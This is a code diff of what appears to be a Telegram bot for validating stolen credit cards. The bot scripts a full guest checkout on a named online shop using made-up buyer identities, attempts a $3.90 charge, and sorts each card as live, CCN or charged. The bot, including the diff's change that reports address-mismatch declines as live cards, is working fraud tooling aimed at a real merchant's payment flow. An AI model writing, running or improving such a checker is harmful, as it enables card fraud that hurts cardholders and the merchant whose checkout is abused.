@@ -41,7 +41,6 @@ const addresses = [
 const randomEmails = ['jhefvrix', 'shawnph', 'testuser', 'fireflybuyer', 'user99x'];
 const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
 
-// Suportado pareho ang /avs at /g commands
 bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const lista = match[1].trim();
@@ -60,7 +59,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
     bot.sendMessage(chatId, `🔍 **Checking Card:** \`${lista}\` ...`, { parse_mode: 'Markdown' });
 
     try {
-        // Fetch BIN Details galing sa libreng binlist API
         let binData = { brand: 'N/A', type: 'N/A', category: 'N/A', bank: 'N/A', country: 'N/A', emoji: '🌐' };
         try {
             const binClean = cc.replace(/\s+/g, '').substring(0, 6);
@@ -96,7 +94,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
         const remail = randomEmails[Math.floor(Math.random() * randomEmails.length)] + Math.floor(Math.random() * 900 + 100) + '@gmail.com';
         const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);
 
-        // 1. ADD TO CART
         await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
             headers: {
                 'authority': 'fireflyfuel.com',
@@ -109,7 +106,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             }
         });
 
-        // 2. CHECKOUT GET
         await client.get('https://fireflyfuel.com/checkout', {
             headers: {
                 'authority': 'fireflyfuel.com',
@@ -120,7 +116,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             }
         });
 
-        // 3. CHECKOUT GUEST POST
         await client.post('https://fireflyfuel.com/checkout', `type=guest&guestEmail=${encodeURIComponent(remail)}&offers=1`, {
             headers: {
                 'authority': 'fireflyfuel.com',
@@ -133,7 +128,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             }
         });
 
-        // 4. CHECKOUT INFO POST
         const infoData = `shipping%5Bcountry%5D=US&shipping%5BUS%5D%5BfirstName%5D=${encodeURIComponent(rfname)}&shipping\%5BUS\%5D\%5BlastName\%5D=${encodeURIComponent(rlname)}&shipping%5BUS%5D%5Bcompany%5D=&shipping%5BUS%5D%5Bphone%5D=${rphone}&shipping\%5BUS\%5D\%5Baddress1\%5D=${encodeURIComponent(raddrInfo.addr)}&shipping%5BUS%5D%5Baddress2%5D=&shipping%5BUS%5D%5Bcity%5D=${encodeURIComponent(raddrInfo.city)}&shipping\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&shipping%5BUS%5D%5Bzipcode%5D=${raddrInfo.zip}&shipping\%5BCA\%5D\%5BfirstName\%5D=&shipping\%5BCA\%5D\%5BlastName\%5D=&shipping\%5BCA\%5D\%5Bcompany\%5D=&shipping\%5BCA\%5D\%5Bphone\%5D=&shipping\%5BCA\%5D\%5Baddress1\%5D=&shipping\%5BCA\%5D\%5Baddress2\%5D=&shipping\%5BCA\%5D\%5Bcity\%5D=&shipping\%5BCA\%5D\%5Bstate\%5D=ON&shipping\%5BCA\%5D\%5Bzipcode\%5D=&shipping\%5BGU\%5D\%5BfirstName\%5D=&shipping\%5BGU\%5D\%5BlastName\%5D=&shipping\%5BGU\%5D\%5Bcompany\%5D=&shipping\%5BGU\%5D\%5Bphone\%5D=&shipping\%5BGU\%5D\%5Baddress1\%5D=&shipping\%5BGU\%5D\%5Baddress2\%5D=&shipping\%5BGU\%5D\%5Bcity\%5D=&shipping\%5BGU\%5D\%5Bstate\%5D=GU&shipping\%5BGU\%5D\%5Bzipcode\%5D=&shipping\%5BPR\%5D\%5BfirstName\%5D=&shipping\%5BPR\%5D\%5BlastName\%5D=&shipping\%5BPR\%5D\%5Bcompany\%5D=&shipping\%5BPR\%5D\%5Bphone\%5D=&shipping\%5BPR\%5D\%5Baddress1\%5D=&shipping\%5BPR\%5D\%5Baddress2\%5D=&shipping\%5BPR\%5D\%5Bcity\%5D=&shipping\%5BPR\%5D\%5Bstate\%5D=PR&shipping\%5BPR\%5D\%5Bzipcode\%5D=&shipping\%5BMX\%5D\%5BfirstName\%5D=&shipping\%5BMX\%5D\%5BlastName\%5D=&shipping\%5BMX\%5D\%5Bcompany\%5D=&shipping\%5BMX\%5D\%5Bphone\%5D=&shipping\%5BMX\%5D\%5Baddress1\%5D=&shipping\%5BMX\%5D\%5Baddress2\%5D=&shipping\%5BMX\%5D\%5Bcity\%5D=&shipping\%5BMX\%5D\%5Bstate\%5D=AG&shipping\%5BMX\%5D\%5Bzipcode\%5D=&shipping\%5BAU\%5D\%5BfirstName\%5D=&shipping\%5BAU\%5D\%5BlastName\%5D=&shipping\%5BAU\%5D\%5Bcompany\%5D=&shipping\%5BAU\%5D\%5Bphone\%5D=&shipping\%5BAU\%5D\%5Baddress1\%5D=&shipping\%5BAU\%5D\%5Baddress2\%5D=&shipping\%5BAU\%5D\%5Bcity\%5D=&shipping\%5BAU\%5D\%5Bstate\%5D=&shipping\%5BAU\%5D\%5Bzipcode\%5D=&shipping\%5BNZ\%5D\%5BfirstName\%5D=&shipping\%5BNZ\%5D\%5BlastName\%5D=&shipping\%5BNZ\%5D\%5Bcompany\%5D=&shipping\%5BNZ\%5D\%5Bphone\%5D=&shipping\%5BNZ\%5D\%5Baddress1\%5D=&shipping\%5BNZ\%5D\%5Baddress2\%5D=&shipping\%5BNZ\%5D\%5Bcity\%5D=&shipping\%5BNZ\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5BfirstName\%5D=&shipping\%5BPH\%5D\%5BlastName\%5D=&shipping\%5BPH\%5D\%5Bcompany\%5D=&shipping\%5BPH\%5D\%5Bphone\%5D=&shipping\%5BPH\%5D\%5Baddress1\%5D=&shipping\%5BPH\%5D\%5Baddress2\%5D=&shipping\%5BPH\%5D\%5Bcity\%5D=&shipping\%5BPH\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5Bstate\%5D=&shipping\%5BHK\%5D\%5BfirstName\%5D=&shipping\%5BHK\%5D\%5BlastName\%5D=&shipping\%5BHK\%5D\%5Bcompany\%5D=&shipping\%5BHK\%5D\%5Bphone\%5D=&shipping\%5BHK\%5D\%5Baddress2\%5D=&shipping\%5BHK\%5D\%5Baddress1\%5D=&shipping\%5BHK\%5D\%5Bcity\%5D=&billing\%5BsameAsShipping\%5D=1&billing\%5Bcountry\%5D=US&billing\%5BUS\%5D\%5BfirstName\%5D=&billing\%5BUS\%5D\%5BlastName\%5D=&billing\%5BUS\%5D\%5Bcompany\%5D=&billing\%5BUS\%5D\%5Bphone\%5D=&billing\%5BUS\%5D\%5Baddress1\%5D=&billing\%5BUS\%5D\%5Baddress2\%5D=&billing\%5BUS\%5D\%5Bcity\%5D=&billing\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&billing%5BUS%5D%5Bzipcode%5D=&billing%5BCA%5D%5BfirstName%5D=&billing%5BCA%5D%5BlastName%5D=&billing%5BCA%5D%5Bcompany%5D=&billing%5BCA%5D%5Bphone%5D=&billing%5BCA%5D%5Baddress1%5D=&billing%5BCA%5D%5Baddress2%5D=&billing%5BCA%5D%5Bcity%5D=&billing%5BCA%5D%5Bstate%5D=ON&billing%5BCA%5D%5Bzipcode%5D=&billing%5BGU%5D%5BfirstName%5D=&billing%5BGU%5D%5BlastName%5D=&billing%5BGU%5D%5Bcompany%5D=&billing%5BGU%5D%5Bphone%5D=&billing%5BGU%5D%5Baddress1%5D=&billing%5BGU%5D%5Baddress2%5D=&billing%5BGU%5D%5Bcity%5D=&billing%5BGU%5D%5Bstate%5D=GU&billing%5BGU%5D%5Bzipcode%5D=&billing%5BPR%5D%5BfirstName%5D=&billing%5BPR%5D%5BlastName%5D=&billing%5BPR%5D%5Bcompany%5D=&billing%5BPR%5D%5Bphone%5D=&billing%5BPR%5D%5Baddress1%5D=&billing%5BPR%5D%5Baddress2%5D=&billing%5BPR%5D%5Bcity%5D=&billing%5BPR%5D%5Bstate%5D=PR&billing%5BPR%5D%5Bzipcode%5D=&billing%5BMX%5D%5BfirstName%5D=&billing%5BMX%5D%5BlastName%5D=&billing%5BMX%5D%5Bcompany%5D=&billing%5BMX%5D%5Bphone%5D=&billing%5BMX%5D%5Baddress1%5D=&billing%5BMX%5D%5Baddress2%5D=&billing%5BMX%5D%5Bcity%5D=&billing%5BMX%5D%5Bstate%5D=AG&billing%5BMX%5D%5Bzipcode%5D=&billing%5BAU%5D%5BfirstName%5D=&billing%5BAU%5D%5BlastName%5D=&billing%5BAU%5D%5Bcompany%5D=&billing%5BAU%5D%5Bphone%5D=&billing%5BAU%5D%5Baddress1%5D=&billing%5BAU%5D%5Baddress2%5D=&billing%5BAU%5D%5Bcity%5D=&billing%5BAU%5D%5Bstate%5D=&billing%5BAU%5D%5Bzipcode%5D=&billing%5BNZ%5D%5BfirstName%5D=&billing%5BNZ%5D%5BlastName%5D=&billing%5BNZ%5D%5Bcompany%5D=&billing%5BNZ%5D%5Bphone%5D=&billing%5BNZ%5D%5Baddress1%5D=&billing%5BNZ%5D%5Baddress2%5D=&billing%5BNZ%5D%5Bcity%5D=&billing%5BNZ%5D%5Bzipcode%5D=&billing%5BPH%5D%5BfirstName%5D=&billing%5BPH%5D%5BlastName%5D=&billing%5BPH%5D%5Bcompany%5D=&billing%5BPH%5D%5Bphone%5D=&billing%5BPH%5D%5Baddress1%5D=&billing%5BPH%5D%5Baddress2%5D=&billing%5BPH%5D%5Bcity%5D=&billing%5BPH%5D%5Bzipcode%5D=&billing%5BPH%5D%5Bstate%5D=&billing%5BHK%5D%5BfirstName%5D=&billing%5BHK%5D%5BlastName%5D=&billing%5BHK%5D%5Bcompany%5D=&billing%5BHK%5D%5Bphone%5D=&billing%5BHK%5D%5Baddress2%5D=&billing%5BHK%5D%5Baddress1%5D=&billing%5BHK%5D%5Bcity%5D=`;
 
         await client.post('https://fireflyfuel.com/checkout/info', infoData, {
@@ -149,7 +143,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             }
         });
 
-        // 5. CHECKOUT PAYMENT PAGE GET
         await client.get('https://fireflyfuel.com/checkout/payment', {
             headers: {
                 'authority': 'fireflyfuel.com',
@@ -160,7 +153,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             }
         });
 
-        // 6. RUN PAYMENT AJAX
         const paymentData = `x_amount=3.90&x_order_id=&x_cust_id=&x_first_name=${encodeURIComponent(rfname)}&x_last_name=${encodeURIComponent(rlname)}&x_address=${encodeURIComponent(raddrInfo.addr)}&x_city=${encodeURIComponent(raddrInfo.city)}&x_state=${raddrInfo.state}&x_zip=${raddrInfo.zip}&x_phone=${rphone}&x_email=${encodeURIComponent(remail)}&x_country=US&x_ship_to_first_name=${encodeURIComponent(rfname)}&x_ship_to_last_name=${encodeURIComponent(rlname)}&x_ship_to_address=${encodeURIComponent(raddrInfo.addr)}&x_ship_to_city=${encodeURIComponent(raddrInfo.city)}&x_ship_to_state=${raddrInfo.state}&x_ship_to_zip=${raddrInfo.zip}&x_ship_to_phone=${rphone}&x_ship_to_country=US&x_card_num=${cc}&x_exp_date=${mes}${ano}&x_card_code=${cvv1}`;
 
         const payRes = await client.post('https://fireflyfuel.com/checkout/run-payment.ajax', paymentData, {
@@ -184,25 +176,21 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
 
         const overallTime = ((Date.now() - startTime) / 1000).toFixed(2);
 
-        // Styling na kauri ng larawan mo (Tree format)
-        let statusText = 'DECLINED';
+        // Husto a panang-taming ti AVS mismatch kas Live (CVV)
         let chargeType = 'DECLINED';
-
-        if (message.includes('address provided does not match') || message.includes('AVS mismatch')) {
-            statusText = '#CVV - Address Mismatch (Live)';
-            chargeType = 'CVV';
-        } else if (message.includes('Invalid CVV') || message.includes('Insufficient funds')) {
-            statusText = '#CCN';
+        if (message.toLowerCase().includes('address provided does not match') || message.toLowerCase().includes('avs mismatch')) {
+            chargeType = 'CVV (AVS Mismatch Live)';
+            message = 'The transaction has been declined because of an AVS mismatch. (Live Card)';
+        } else if (message.toLowerCase().includes('invalid cvv') || message.toLowerCase().includes('insufficient funds')) {
             chargeType = 'CCN';
         } else if (result === 'success') {
-            statusText = '#CVV - CHARGED $3.90';
-            chargeType = 'CVV CHARGED';
+            chargeType = 'CVV CHARGED $3.90';
         }
 
         let finalResponse = `┏• CC: \`${lista}\`\n`;
-        finalResponse += `┣• ❌ ${message}\n`;
+        finalResponse += `┣• ✅ ${message}\n`;
         finalResponse += `┣• Charge Type: ${chargeType}\n`;
-        finalResponse += `┣• Gateway: FireflyFuel | AVS Checker\n`;
+        finalResponse += `┣• Gateway: Custom AVS Checker\n`;
         finalResponse += `┗• Execution Time: ${overallTime} seconds\n\n`;
         
         finalResponse += `┏• BIN DATA\n`;
